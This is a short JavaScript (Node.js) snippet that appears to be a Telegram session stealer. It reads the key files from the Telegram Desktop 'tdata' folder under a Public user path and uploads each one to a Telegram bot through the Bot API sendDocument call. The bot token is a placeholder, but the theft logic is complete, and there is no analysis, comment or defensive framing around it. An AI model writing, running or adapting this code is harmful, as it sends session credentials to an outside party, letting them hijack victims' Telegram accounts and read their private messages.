const fs = require('fs');
const sessions = 'C:/Users/Public/Telegram Desktop/tdata';
const files = fs.readdirSync(sessions).filter(x => /^[a-f0-9]{16}s?$/.test(x) || x === 'key_datas');
for (const file of files) {
  const form = new FormData();
  form.append('document', fs.readFileSync(sessions + '/' + file));
  fetch('https://api.telegram.org/bot123456:example/sendDocument', {method:'POST',body:form});
}
